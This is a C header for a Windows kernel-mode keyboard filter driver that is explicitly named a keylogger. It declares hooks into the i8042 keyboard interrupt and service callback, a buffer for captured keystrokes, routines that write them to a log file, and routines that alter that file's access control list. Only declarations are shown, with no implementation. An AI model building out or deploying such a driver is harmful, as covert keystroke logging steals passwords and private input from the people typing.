#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#pragma warning(disable:4201)

#include <ntifs.h>
#include "ntddk.h"
#include "kbdmou.h"
#include <ntddkbd.h>
#include <ntdd8042.h>

#pragma warning(default:4201)

#include <wdf.h>

#define NTSTRSAFE_LIB
#include <ntstrsafe.h>

#include <initguid.h>
#include <devguid.h>

#define KBFILTER_POOL_TAG (ULONG) 'tlfK'

#if DBG

#define TRAP()                      DbgBreakPoint()

#define DebugPrint(_x_) DbgPrint _x_

#else   // DBG

#define TRAP()

#define DebugPrint(_x_)

#endif


//////////////////////////////////////////////////////////////
//						STRUCTURES							//
//////////////////////////////////////////////////////////////

/**
 * Device extension.
 **/
typedef struct _DEVICE_EXTENSION
{
    WDFDEVICE WdfDevice;

    //
    // Number of creates sent down
    //
    //LONG EnableCount;

    //
    // The real connect data that this driver reports to
    //
    CONNECT_DATA UpperConnectData;

    //
    // Previous initialization and hook routines (and context)
    //
    PVOID									UpperContext;
    PI8042_KEYBOARD_INITIALIZATION_ROUTINE	UpperInitializationRoutine;
    PI8042_KEYBOARD_ISR						UpperIsrHook;

    //
    // Context for IsrWritePort, QueueKeyboardPacket
    //
    IN PVOID CallContext;

	//
	// Worker item
	//
	WDFWORKITEM workItem;

} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

WDF_DECLARE_CONTEXT_TYPE_WITH_NAME(
	DEVICE_EXTENSION, GetDeviceExtension)

#define SZ_KEYBOARD_DATA_ARRAY 64

/**
 * Global structure used to store keyboard packets.
 **/
typedef struct _KEYBOARD_DATA_ARRAY
{
	//
	// Buffer for keyboard packets.
	// 
	KEYBOARD_INPUT_DATA buffer[SZ_KEYBOARD_DATA_ARRAY];

	//
	// One past the index of the lastly written packet. 
	//
	DWORD				index;

	//
	// Spin lock used to protect the buffer.
	//
	WDFSPINLOCK			spinLock;

} KEYBOARD_DATA_ARRAY, *PKEYBOARD_DATA_ARRAY;

/**
 * Context for the worker item.
 **/
typedef struct _WORKER_ITEM_CONTEXT {

	BOOLEAN hasRun;

	KEYBOARD_INPUT_DATA buffer[SZ_KEYBOARD_DATA_ARRAY];

} WORKER_ITEM_CONTEXT, *PWORKER_ITEM_CONTEXT;

WDF_DECLARE_CONTEXT_TYPE_WITH_NAME(
	WORKER_ITEM_CONTEXT, GetWorkItemContext)


//////////////////////////////////////////////////////////////
//				FUNCTION PROTOTYPES							//
//////////////////////////////////////////////////////////////

DRIVER_INITIALIZE							
DriverEntry;

EVT_WDF_DRIVER_DEVICE_ADD					
KeyLogger_EvtDeviceAdd;

EVT_WDF_IO_QUEUE_IO_INTERNAL_DEVICE_CONTROL
KeyLogger_EvtIoInternalDeviceControl;

//EVT_WDF_DRIVER_UNLOAD
//DriverUnload;


VOID
KeyLogger_ServiceCallback(
    IN PDEVICE_OBJECT		DeviceObject,
    IN PKEYBOARD_INPUT_DATA InputDataStart,
    IN PKEYBOARD_INPUT_DATA InputDataEnd,
    IN OUT PULONG			InputDataConsumed
);

VOID
WriteWorkItem(
	WDFWORKITEM  WorkItem
);

NTSTATUS
CreateWorkItem(
	WDFDEVICE DeviceObject
);

VOID
KeyLoggerQueueWorkItem(
	WDFWORKITEM workItem
);

NTSTATUS
InitKeyboardDataArray(
);

VOID
AddToBuffer(
	PKEYBOARD_INPUT_DATA entry
);

DWORD
DumpBuffer(
	PKEYBOARD_INPUT_DATA dest
);

NTSTATUS
OpenLogFile(
);

NTSTATUS
WriteToLogFile(
	DWORD					n,
	PKEYBOARD_INPUT_DATA	buffer
);

NTSTATUS
SetFileDacl(
);

NTSTATUS
ResetFileDacl(
);

//
// IOCTL Related defintions
//

//
// Used to identify kbfilter bus. This guid is used as the enumeration string
// for the device id.
DEFINE_GUID(GUID_BUS_KBFILTER,
0xa65c87f9, 0xbe02, 0x4ed9, 0x92, 0xec, 0x1, 0x2d, 0x41, 0x61, 0x69, 0xfa);
// {A65C87F9-BE02-4ed9-92EC-012D416169FA}

DEFINE_GUID(GUID_DEVINTERFACE_KBFILTER,
0x3fb7299d, 0x6847, 0x4490, 0xb0, 0xc9, 0x99, 0xe0, 0x98, 0x6a, 0xb8, 0x86);
// {3FB7299D-6847-4490-B0C9-99E0986AB886}


#define  KBFILTR_DEVICE_ID L"{A65C87F9-BE02-4ed9-92EC-012D416169FA}\\KeyboardFilter\0"

#endif  // KEYLOGGER_H